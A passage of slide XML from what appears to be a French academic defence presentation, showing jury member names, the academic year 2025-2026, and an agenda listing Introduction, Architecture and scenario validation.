        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Google Shape;29;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8717280" y="4775200"/>
            <a:ext cx="2316480" cy="463296"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5B9BD5"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="121900" tIns="121900" rIns="121900" bIns="121900" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr sz="1867"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Google Shape;30;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8717280" y="4775200"/>
            <a:ext cx="2316480" cy="463296"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:buClr>
                <a:srgbClr val="FFFFFF"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Devant le jury</a:t>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Google Shape;31;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="795383" y="5547360"/>
            <a:ext cx="2682240" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buClr>
                <a:srgbClr val="1A1A1A"/>
              </a:buClr>
              <a:buSzPts val="1050"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>✓  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Pr.Asmae</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Hmami</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Google Shape;37;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5059680" y="5547360"/>
            <a:ext cx="2682240" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buClr>
                <a:srgbClr val="1A1A1A"/>
              </a:buClr>
              <a:buSzPts val="1050"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>✓  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Soukaina </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Douazi</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" dirty="0" err="1">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Google Shape;40;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8032376" y="5449226"/>
            <a:ext cx="2804160" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buClr>
                <a:srgbClr val="1A1A1A"/>
              </a:buClr>
              <a:buSzPts val="1050"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>✓  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Pr.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" b="1" dirty="0"/>
              <a:t> M. Carlos </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" b="1" dirty="0" err="1"/>
              <a:t>Adonko</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" b="1" dirty="0"/>
              <a:t> Koffi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Google Shape;41;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10728960" y="5644896"/>
            <a:ext cx="1341120" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buClr>
                <a:srgbClr val="5B9BD5"/>
              </a:buClr>
              <a:buSzPts val="1050"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="5B9BD5"/>
              </a:solidFill>
              <a:ea typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Google Shape;42;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8032376" y="5833633"/>
            <a:ext cx="2804160" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buClr>
                <a:srgbClr val="1A1A1A"/>
              </a:buClr>
              <a:buSzPts val="1050"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>✓  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Pr.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1467" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Asmae</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1467" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1467" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Hmami</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1467" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Google Shape;43;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10726057" y="5833633"/>
            <a:ext cx="1341120" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buClr>
                <a:srgbClr val="5B9BD5"/>
              </a:buClr>
              <a:buSzPts val="1050"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B9BD5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Encadrante</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="44" name="Google Shape;44;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3048000" y="6437376"/>
            <a:ext cx="6096000" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:buClr>
                <a:srgbClr val="1A1A1A"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1467" b="1">
                <a:solidFill>
                  <a:srgbClr val="1A1A1A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Année universitaire : 2025 - 2026</a:t>
            </a:r>
            <a:endParaRPr sz="1467">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Image 1" descr="Image téléchargée">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D7EE845D-E198-62D8-9527-397FA01EBEEB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="235860" y="146960"/>
            <a:ext cx="2438400" cy="627741"/>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
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Google Shape;36;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="384048"/>
            <a:ext cx="10058400" cy="2926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9E5E"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>SOMMAIRE</a:t>
            </a:r>
            <a:endParaRPr sz="1300" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Google Shape;37;p4"/>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i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>Plan de la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2700" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>présentation</a:t>
            </a:r>
            <a:endParaRPr sz="2700" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Google Shape;38;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1539517"/>
            <a:ext cx="5349240" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9756"/>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9" name="Google Shape;39;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="1600200"/>
            <a:ext cx="822960" cy="7498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86C0"/>
              </a:buClr>
              <a:buSzPts val="2200"/>
              <a:buFont typeface="Cambria"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E86C0"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>01</a:t>
            </a:r>
            <a:endParaRPr sz="2200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Google Shape;40;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1508760" y="1600200"/>
            <a:ext cx="4251960" cy="7498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500"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Introduction </a:t>
            </a:r>
            <a:endParaRPr sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Google Shape;41;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2496312"/>
            <a:ext cx="5349240" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9756"/>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2" name="Google Shape;42;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="2496312"/>
            <a:ext cx="822960" cy="7498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E11D48"/>
              </a:buClr>
              <a:buSzPts val="2200"/>
              <a:buFont typeface="Cambria"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E11D48"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>02</a:t>
            </a:r>
            <a:endParaRPr sz="2200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Google Shape;43;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1508760" y="2496312"/>
            <a:ext cx="4251960" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="91425" tIns="45700" rIns="91425" bIns="45700" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0">
              <a:buClr>
                <a:srgbClr val="0F172A"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Architecture</a:t>
            </a:r>
            <a:endParaRPr sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Google Shape;45;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="3392424"/>
            <a:ext cx="822960" cy="7498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86C0"/>
              </a:buClr>
              <a:buSzPts val="2200"/>
              <a:buFont typeface="Cambria"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="2200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Google Shape;48;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="4288536"/>
            <a:ext cx="822960" cy="7498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9E5E"/>
              </a:buClr>
              <a:buSzPts val="2200"/>
              <a:buFont typeface="Cambria"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="2200" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="53" name="Google Shape;53;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6217920" y="1600200"/>
            <a:ext cx="5349240" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9756"/>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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6382512" y="1600200"/>
            <a:ext cx="822960" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="91425" tIns="45700" rIns="91425" bIns="45700" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0">
              <a:buClr>
                <a:srgbClr val="0E86C0"/>
              </a:buClr>
              <a:buSzPts val="2200"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E86C0"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="Google Shape;55;p4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="1600200"/>
            <a:ext cx="4251960" cy="7498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500"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Validation du </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>scénario</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
